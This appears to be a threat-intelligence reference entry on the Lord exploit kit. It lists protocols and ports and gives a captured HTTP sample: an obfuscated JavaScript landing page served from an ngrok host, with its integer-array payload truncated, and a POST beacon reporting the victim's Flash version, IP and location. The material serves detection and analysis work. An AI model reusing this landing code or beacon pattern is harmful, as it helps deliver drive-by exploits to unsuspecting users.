# Lord EK

# Links:
https://www.malware-traffic-analysis.net/2019/08/02/index.html

# Protocols:
HTTP
TCP
DNS

# Ports:
80
53
4567
5552


# Sample:

```
GET /?GHRYb1AYhUQ7CY1Z3sfJHfdgiXnfmlZgiC2g7pV52z6UG8W3Lq4k0vs0ZIdzxVuY HTTP/1.1
Accept: text/html, application/xhtml+xml, */*
Accept-Language: en-US
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept-Encoding: gzip, deflate
DNT: 1
Connection: Keep-Alive
Host: 7b2cdd48.ngrok.io

HTTP/1.1 200 OK
Date: Thu, 01 Aug 2019 17:19:06 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked

<html>
<head>
</head>
<body>
    <script>
var erp = new Array;
erp[0] = 1013478509;
erp[1] = 1816005898;
erp[2] = 1008807213;
erp[3] = 541880178;
erp[4] = 1679836491;
erp[5] = 539828300;
erp[6] = 1634624617;
erp[7] = 1852252272;
erp[8] = 1634166048;
erp[9] = 757939725;
erp[10] = 171731045;
erp[11] = 1633959437;
erp[12] = 169877536;
erp[13] = 540832611;
erp[14] = 1919512692;
erp[15] = 1041041929;
...
erp[824] = 1953328190;
erp[825] = 0;
var em = '';
for(i=0;i<erp.length;i++){
	tmp = erp[i];
	if(Math.floor((tmp/Math.pow(256,3)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,3))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,3))) * Math.pow(256,3));
	if(Math.floor((tmp/Math.pow(256,2)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,2))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,2))) * Math.pow(256,2));
	if(Math.floor((tmp/Math.pow(256,1)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,1))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,1))) * Math.pow(256,1));
	if(Math.floor((tmp/Math.pow(256,0)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,0))));
	};
};
document.write(em);

    </script>
</body>
</html.


POST /?GHRYb1AYhUQ7CY1Z3sfJHfdgiXnfmlZgiC2g7pV52z6UG8W3Lq4k0vs0ZIdzxVuY HTTP/1.1
Accept: */*
Content-Type: application/json
Referer: http://7b2cdd48.ngrok.io/?GHRYb1AYhUQ7CY1Z3sfJHfdgiXnfmlZgiC2g7pV52z6UG8W3Lq4k0vs0ZIdzxVuY
Accept-Language: en-US
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: 7b2cdd48.ngrok.io
Content-Length: 90
DNT: 1
Connection: Keep-Alive
Cache-Control: no-cache

{"flash":27,"ip_address":"173.166.146.112","country":"United States","city":"Baton Rouge"}
```
